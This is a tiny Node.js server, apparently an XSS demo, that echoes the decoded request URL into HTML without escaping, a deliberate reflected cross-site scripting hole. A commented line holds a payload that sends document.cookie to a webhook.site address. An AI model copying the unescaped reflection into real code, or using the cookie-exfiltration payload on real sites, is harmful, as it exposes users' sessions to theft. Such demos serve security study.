var http = require('http');

http.createServer(function (req, res) {
  res.write('<html><h1>' + decodeURI(req.url).slice(1) + '</h1></html>'); 
}).listen(8080); 


//document.write('<img src="https://webhook.site/<path>?cookie=' + document.cookie + '" />')
